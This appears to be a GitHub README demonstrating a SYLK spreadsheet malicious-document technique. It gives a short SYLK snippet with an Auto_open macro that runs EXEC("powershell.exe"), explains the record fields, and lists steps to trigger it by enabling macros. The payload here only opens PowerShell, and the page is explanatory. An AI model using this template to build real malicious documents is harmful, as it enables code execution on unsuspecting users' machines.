## Maldoc Documentation

This repo will explain on how malware document using SYLK works.

Below is the SYLK code:
```
ID;P
O;E
NN;NAuto_open;ER1C1;KOut Flank;F
C;X1;Y1;K0;EEXEC("powershell.exe") cell , row one column 1 to open the powershell
C;X1;Y2;K0;EHALT() cell, row 2 column 1 to halt the process
E
```

Code explanation:
```
ID: A header to identify spreadsheet type and creator
O: Options 
E: Macro Sheet
NN: Define names
F: Usable as  function
C: Cell content
X: Column
Y: Row 
K: Value of the cell

```

Steps:
```
1. Copy the code into your text editor
2. Save the file as .slk
3. Then open the .slk file and enable macro
4. Powershell will automatically open
```

Example:
![image](https://user-images.githubusercontent.com/44106858/114968685-71276180-9ea9-11eb-8c47-35d507a65837.png)

After we enable macro, windows powershell will automatically open
![image](https://user-images.githubusercontent.com/44106858/114968993-09bde180-9eaa-11eb-9082-9533954200ab.png)
